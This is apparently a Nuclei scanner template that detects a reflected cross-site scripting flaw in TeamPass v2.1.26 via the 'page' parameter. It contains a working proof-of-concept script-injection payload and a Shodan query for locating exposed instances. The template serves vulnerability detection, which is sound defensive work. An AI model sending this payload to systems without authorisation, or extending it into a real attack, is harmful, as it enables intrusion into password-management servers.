id: teampass-xss

info:
  name: TeamPass v2.1.26 - Cross Site Scripting
  author: arafatansari
  severity: medium
  description: |
    TeamPass v2.1.26 was discovered to contain a Reflected Cross Site Scripting at index.php via page parameter.
  reference:
    - https://github.com/nilsteampassnet/TeamPass/issues/1676
  metadata:
    verified: true
    shodan-query: http.html:"teampass"
  tags: teampass,xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?page=itemsxfedz%20\"/><script>alert(1)</script>-'uye4c&group="

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '<script>alert(1)</script>'
          - 'Teampass'
        condition: and

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
